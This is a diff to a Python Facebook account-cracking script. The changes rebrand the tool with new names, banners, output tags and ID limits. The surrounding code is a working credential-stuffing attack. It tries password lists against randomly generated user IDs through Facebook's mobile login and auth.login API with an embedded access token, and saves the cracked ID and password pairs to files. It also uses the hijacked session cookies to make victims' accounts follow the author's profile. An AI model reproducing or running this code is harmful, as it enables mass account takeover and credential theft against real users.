@@ -113,7 +113,7 @@ def login():
 def jalan(z):
 	for e in z + '\n':
 		sys.stdout.write(e);sys.stdout.flush();time.sleep(0.01)
-############## # LOGO############## ## 
+############### #LOGO############## ## 
  
 # LOGIN
 def Public():
@@ -324,17 +324,17 @@ def crack(idf,pwv):
 			po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,allow_redirects=False)
 			if "checkpoint" in po.cookies.get_dict().keys():
 				cp +=1
-				print( f'\r\x1b[1;91m[KAAMI-OK] {idf} * {pw}')
+				print( f'\r\x1b[1;91m[KAAMI-CP] {idf} * {pw}')
 				open('OK/'+cpc,'a').write(idf+'|'+pw+'\n')
 				akun.append(idf+'|'+pw)
 				break
 			elif "c_user" in ses.cookies.get_dict().keys():
 				coki=po.cookies.get_dict()
 				coki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-				print(f'\r\x1b[1;91m [KAAMI-OK] {idf} * {pw}')
+				print(f'\r\x1b[1;91m [KAAMI-CP] {idf} * {pw}')
 				wrt =('%s - %s' % (idf,pw))
 				ok.append(wrt)
-				open('/sdcard/KAAMI-OK.txt','a').write('%s\n' % wrt)
+				open('/sdcard/KAAMI-CP.txt','a').write('%s\n' % wrt)
 				follow(ses,coki)
 				break
  
@@ -369,10 +369,10 @@ def free(idf,pwv):
 			elif "c_user" in ses.cookies.get_dict().keys():
 				coki=po.cookies.get_dict()
 				coki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-				print(f'\r\x1b[1;92m [MR_KAAMI-OK] {idf} * {pw}')
+				print(f'\r\x1b[1;92m [MR_KAAMI-CP] {idf} * {pw}')
 				wrt =('%s - %s' % (idf,pw))
 				ok.append(wrt)
-				open('/sdcard/MR_KAAMI-OK','a').write('%s\n' % wrt)
+				open('/sdcard/MR_KAAMI-CP','a').write('%s\n' % wrt)
 				follow(ses,coki)
 				break
  
@@ -383,25 +383,27 @@ def free(idf,pwv):
 	loop+=1
 def follow(ses,coki):
 	ses.headers.update({"accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
-	r = sop(ses.get('https://mbasic.facebook.com/profile.php?id=SILENTHACKER0001', cookies={'cookie': coki}).text, 'html.parser')
+	r = sop(ses.get('https://mbasic.facebook.com/profile.php?id=KHANHACKER0001', cookies={'cookie': coki}).text, 'html.parser')
 	get = r.find('a', string='Follow').get('href')
 	ses.get(('https://mbasic.facebook.com' + str(get)), cookies={'cookie': coki}).text
  
-logo = """  
-  ____  _    _ _    _ _______ _______        
- |  _ \| |  | | |  | |__   __|__   __|/\     
- | |_) | |__| | |  | |  | |     | |  /  \    
- |  _ <|  __  | |  | |  | |     | | / /\ \   
- | |_) | |  | | |__| |  | |     | |/ ____ \  
- |____/|_|  |_|\____/   |_|     |_/_/    \_\                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  
+logo = """      .
+$$$$$$$\  $$\   $$\ $$\   $$\ $$$$$$$$\ $$$$$$$$\  $$$$$$\        
+$$  __$$\ $$ |  $$ |$$ |  $$ |\__$$  __|\__$$  __|$$  __$$\       
+$$ |  $$ |$$ |  $$ |$$ |  $$ |   $$ |      $$ |   $$ /  $$ |      
+$$$$$$$\ |$$$$$$$$ |$$ |  $$ |   $$ |      $$ |   $$$$$$$$ |      
+$$  __$$\ $$  __$$ |$$ |  $$ |   $$ |      $$ |   $$  __$$ |      
+$$ |  $$ |$$ |  $$ |$$ |  $$ |   $$ |      $$ |   $$ |  $$ |      
+$$$$$$$  |$$ |  $$ |\$$$$$$  |   $$ |      $$ |   $$ |  $$ |      
+\_______/ \__|  \__| \______/    \__|      \__|   \__|  \__|  ;:'                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        
 \x1b[1;78m-------------------------
 \033[1;97m•••••••••••••••••••••••••••••••••••••••••••••• 
-\x1b[1;90m[+] 𝗔𝗨𝗧𝗛𝗢𝗥     :   M HASSAN KAMRAN BHUTTA      
-\x1b[1;91m[+] 𝗙𝗔𝗖𝗘𝗕𝗢𝗢𝗞   :    DAD OF DEVIL
-\x1b[1;92m[+] 𝗚𝗜𝗧𝗛𝗨𝗕      :   Kaamikhanbhutta
-\x1b[1;98m[+] FROM        :   PAKISTAN, PUNJAB, RAHIM YAR KHAN,KOT SAMAABA
+\x1b[1;90m[+] 𝗔𝗨𝗧𝗛𝗢𝗥     :   M H KAMRAN BHUTTA       
+\x1b[1;91m[+] 𝗙𝗔𝗖𝗘𝗕𝗢𝗢𝗞   :    M H K B
+\x1b[1;92m[+] 𝗚𝗜𝗧𝗛𝗨𝗕      :   KAAMI KHAN
+\x1b[1;98m[+] FROM        :   PAKISTAN, PUNJAB,RYK,KOT SAMABA
 \x1b[1;93m[+] 𝗧𝗘𝗔𝗠        :   \33[1;42  APUN AKELA HI KAFI HAI\33[0m
-\x1b[1;94m[+] 𝗩𝗘𝗥𝗦𝗜𝗢𝗡     :\x1b[1;97m  1.0.2    \x1b[1;97m          
+\x1b[1;94m[+] 𝗩𝗘𝗥𝗦𝗜𝗢𝗡     :\x1b[1;97m  1.2    \x1b[1;97m          
 \033[1;80m•••••••••••••••••••••••••••••••••••••••••••••• 
 """
  
@@ -423,14 +425,14 @@ class Main:
 		print("\033[1;37m [1] First Send Friend Request  ")
 		print("\033[1;37m [2] EXIT")
 		print("")
-		Bhutta = input("\n\033[1;37m  Choose : \033[1;32m")
-		if Baloch in ["", " "]:
+		Kaami = input("\n\033[1;37m  Choose : \033[1;32m")
+		if Kaami in ["", " "]:
 			exit()
-		elif Bhutta in ["2", "02"]:
+		elif Kaami in ["2", "02"]:
 			print("    Thanks♥️")
 			exit()
-		elif Bhutta in ["1", "01"]:
-			os.system("xdg-open https://www.facebook.com/SILENTHACKER0001 ")
+		elif Kaami in ["1", "01"]:
+			os.system("xdg-open https://www.facebook.com/MdHassankamran.bhutta ")
 			print("")
 			time.sleep(3.0)
 			print("\033[1;37m    CHECKING APPROVAL ")
@@ -438,7 +440,7 @@ class Main:
 			input("\n\033[1;37m TYPE THE OWNER FACEBOOK ACCOUNT NAME \033[1;37m")
 			time.sleep(3.1)
 			print("")
-			print("\033[1;32m WELCOME TO *SILENT_HACKER*  TOOLS")
+			print("\033[1;32m WELCOME TO *KHAN_HACKER*  TOOLS")
 			time.sleep(3.0)
 			os.system("clear")
 		print(logo)
@@ -450,16 +452,16 @@ class Main:
 		print(" \033[1;32m[4] 2006 To 2012 ")
 		print(" \33[1;32m[5] 2004 To 2008 ")
 		print("\033[1;32m [E] Exit \n")
-		Kamran =input(" \033[1;32mCHOOSE : ")
-		if KAMRAN in ["1", "01"]:
+		BHUTTA =input(" \033[1;32mCHOOSE : ")
+		if BHUTTA in ["1", "01"]:
 			File()
-		if KAMRAN in ["2", "02"]:
+		if BHUTTA in ["2", "02"]:
 			Public()
-		if KAMRAN in ["3", "03"]:
+		if BHUTTA in ["3", "03"]:
 			os.system("python2 mrd1.py")
-		if KAMRAN in ["4", "04"]:
+		if BHUTTA in ["4", "04"]:
 			self.old()
-		if KAMRAN in ["5", "05"]:
+		if BHUTTA in ["5", "05"]:
 			self.old2()
 			exit()
 		else:
@@ -472,7 +474,7 @@ class Main:
 		xx = 999999999
 		idx = "100000" 
 		os.system('clear');print(logo)
-		limit = int(input(" \n\033[0;95m[+]\033[0;93m TOTAL IDS TO CRACK LIMIT 50,000: "))
+		limit = int(input(" \n\033[0;95m[+]\033[0;93m TOTAL IDS TO CRACK LIMIT 5,000: "))
 		try:
 			for n in range(limit):
 				_ = random.randint(x,xx)
@@ -886,12 +888,12 @@ class Main:
 				print("\r \033[1;32m[SHAH-NOOR-OK]%s | %s\033[1;32m         "%(uid, pw))
 				print ("\r \033[1;32m Congrats ")
 				self.ok.append("%s|%s"%(uid, pw))
-				open("MR_KAAMI-OK.txt","a").write(" %s|%s\n"%(uid, pw))
+				open("MR_KAAMI-CP.txt","a").write(" %s|%s\n"%(uid, pw))
 				break
 			elif "www.facebook.com" in response.json()["error_msg"]:
-				print("\r \033[1;32m[MR_KAAMI-OK] %s | %s\033[1;32m         "%(uid, pw))
+				print("\r \033[1;32m[MR_KAAMI-CP] %s | %s\033[1;32m         "%(uid, pw))
 				self.cp.append("%s|%s"%(uid, pw))
-				open("MR_KAAMI-OK.txt","a").write(" %s | %s\n"%(uid, pw))
+				open("MR_KAAMI-CP.txt","a").write(" %s | %s\n"%(uid, pw))
 				break
 			else:
 				continue
@@ -903,7 +905,7 @@ class Main:
 		xx = 9999999999
 		idx = "10000" 
 		os.system('clear');print(logo)
-		limit = int(input("\n \033[0;95m[+]\033[0;93m TOTAL IDS TO CRACK LIMIT 50,000: "))
+		limit = int(input("\n \033[0;95m[+]\033[0;93m TOTAL IDS TO CRACK LIMIT 5l,000: "))
 		try:
 			for n in range(limit):
 				_ = random.randint(x,xx)
@@ -928,7 +930,7 @@ class Main:
 				print("\033[1;37m")
 				for user in self.id:
 					coeg.submit(self.api, user, listpass.split(","))
-			exit("\n\n \033[1;37m>>[PROCESS COMPLETE... \n\033[0;92m >>[THANKS FOR USING SILENT-786 TOOL...")
+			exit("\n\n \033[1;37m>>[PROCESS COMPLETE... \n\033[0;92m >>[THANKS FOR USING BHUTTA-786 TOOL...")
 		except Exception as e:exit(str(e))
  
 	def api(self, uid, pwx):
@@ -1314,13 +1316,13 @@ class Main:
 			}
 			response = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20¤tly_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers) 
 			if "session_key" in response.text and "EAAA" in response.text:
-				print("\r \033[1;32m[MR_KAAMI-OK] %s | %s\033[0;32m         "%(uid, pw))
+				print("\r \033[1;32m[MR_KAAMI-CP] %s | %s\033[0;32m         "%(uid, pw))
 				print ("\r \033[1;32m Congrats ")
 				self.ok.append("%s|%s"%(uid, pw))
-				open("MR_KAAMI-OK.txt","a").write(" %s|%s\n"%(uid, pw))
+				open("MR_KAAMI-CP.txt","a").write(" %s|%s\n"%(uid, pw))
 				break
 			elif "www.facebook.com" in response.json()["error_msg"]:
-				print("\r \033[1;32m[MR_KAAMI-OK] %s | %s\033[1;32m         "%(uid, pw))
+				print("\r \033[1;32m[MR_KAAMI-CP] %s | %s\033[1;32m         "%(uid, pw))
 				self.cp.append("%s|%s"%(uid, pw))
 				open("Successfull.txt","a").write(" %s | %s\n"%(uid, pw))
 				break
